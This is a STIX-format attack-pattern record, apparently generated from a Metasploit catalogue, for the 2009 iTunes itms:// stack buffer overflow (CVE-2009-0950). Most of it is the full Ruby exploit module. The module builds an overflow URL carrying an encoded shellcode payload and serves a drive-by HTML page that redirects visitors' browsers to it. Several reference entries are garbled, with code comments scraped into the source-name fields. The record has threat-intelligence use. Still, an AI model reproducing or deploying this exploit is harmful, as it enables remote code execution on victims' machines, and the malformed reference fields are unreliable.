{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8bd8bac3-8ce8-4b15-ab49-a052ef970ef7",
    "created": "2024-08-14T17:05:41.486311Z",
    "modified": "2024-08-14T17:05:41.486315Z",
    "name": "Apple OS X iTunes 8.1.1 ITMS Overflow",
    "description": " This modules exploits a stack-based buffer overflow in iTunes",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/itms_overflow.rb",
            "external_id": "itms_overflow.rb"
        },
        {
            "source_name": "#nopopuprequiredtovisititms://URLsinSafari",
            "external_id": "sothrowitinBAP"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0950"
        },
        {
            "source_name": "reference",
            "url": "http://support.apple.com/kb/HT3592"
        },
        {
            "source_name": "reference",
            "url": "http://redpig.dataspill.org/2009/05/drive-by-attack-for-itunes-811.html"
        },
        {
            "source_name": "#buffercontainingthefullURL.However",
            "external_id": "ifacolonanda?occurafter"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  # no popup required to visit itms:// URLs in Safari, so throw it in BAP\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :ua_name    => HttpClients::SAFARI,\n  #  :ua_maxver  => \"4.1\",\n  #  :ua_minver  => \"4.0.5\",\n  #  :javascript => false,\n  #  :rank       => NormalRanking,\n  #  :os_name => OperatingSystems::MAC_OSX\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple OS X iTunes 8.1.1 ITMS Overflow',\n      'Description'    => %q{\n          This modules exploits a stack-based buffer overflow in iTunes\n        itms:// URL parsing.  It is accessible from the browser and\n        in Safari, itms urls will be opened in iTunes automatically.\n        Because iTunes is multithreaded, only vfork-based payloads should\n        be used.\n      },\n      'Author'         => [ 'Will Drewry <redpig[at]dataspill.org>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-0950' ],\n          [ 'OSVDB', '54833' ],\n          [ 'URL', 'http://support.apple.com/kb/HT3592' ],\n          [ 'URL', 'http://redpig.dataspill.org/2009/05/drive-by-attack-for-itunes-811.html' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 1024,  # rough estimate of what browsers will pass.\n          'DisableNops' => true,  # don't pad out the space.\n          'BadChars' => '',\n          # The encoder must be URL-safe otherwise it will be automatically\n          # URL encoded.\n          'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ECX',  # See the comments below\n              'BufferOffset' => 3,  # See the comments below\n            },\n        },\n      'Platform'      => %w{ osx },\n      'Targets'\t=>\n        [\n          [\n            'OS X',\n            {\n              'Platform'      => [ 'osx' ],\n              'Arch'          => ARCH_X86,\n              'Addr'          => 'ATe'\n            },\n          ]\n        ],\n      'DisclosureDate' => '2009-06-01',\n      'DefaultTarget'  => 0))\n  end\n\n  # Generate distribution script, which calls our payload using JavaScript.\n  def generate_itms_page(p)\n    # Set the base itms url.\n    # itms:// or itmss:// can be used.  The trailing colon is used\n    # to start the attack.  All data after the colon is copied to the\n    # stack buffer.\n    itms_base_url = \"itms://:\"\n    itms_base_url << rand_text_alpha(268)  # Fill up the real buffer\n    itms_base_url << rand_text_alpha(16)   # $ebx, $esi, $edi, $ebp\n    itms_base_url << target['Addr']  # hullo there, jmp *%ecx!\n    # The first '/' in the buffer will terminate the copy to the stack buffer.\n    # In addition, $ecx will be left pointing to the last 6 bytes of the heap\n    # buffer containing the full URL.  However, if a colon and a ? occur after\n    # the value in ecx will point to that point in the heap buffer.  In our\n    # case, it will point to the beginning.  The ! is there to make the\n    # alphanumeric shellcode execute easily.  (This is why we need an offset\n    # of 3 in the payload).\n    itms_base_url << \"/:!?\"   # Truncate the stack buffer overflow and prep for payload\n    itms_base_url << p # Wooooooo! Payload time.\n    # We drop on a few extra bytes as the last few bytes can sometimes be\n    # corrupted.\n    itms_base_url << rand_text_alpha(4)\n\n    # Use the pattern creator to simplify exploit creation :)\n    # itms_base_url << Rex::Text.pattern_create(1024,\n    #                                           Rex::Text::DefaultPatternSets)\n\n    # Return back an example URL.  Using an iframe doesn't work with all\n    # browsers, but that's easy enough to fix if you need to.\n    return String(<<-EOS)\n<html>\n<head>\n<title>iTunes loading . . .</title>\n<meta http-equiv=\"refresh\" content=\"0; url='#{itms_base_url}'\">\n</head>\n<body>\n<p>iTunes should open automatically, but if it doesn't, click to\n<a href=\"#{itms_base_url}\">continue</a>.</p>\n</body>\n</html>\nEOS\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Generating payload...\")\n    return unless (p = regenerate_payload(cli))\n    #print_status(\"=> #{payload.encoded}\")\n    print_status(\"=> #{payload.encoded.length} bytes\")\n\n    print_status(\"Generating HTML container...\")\n    page = generate_itms_page(payload.encoded)\n    #print_status(\"=> #{page}\")\n    print_status(\"Sending itms page\")\n\n    header = { 'Content-Type' => 'text/html' }\n    send_response_html(cli, page, header)\n    handler(cli)\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Will Drewry <redpig[at]dataspill.org> ]",
        ""
    ],
    "x_mitre_disclosure_date": "2009-06-01",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}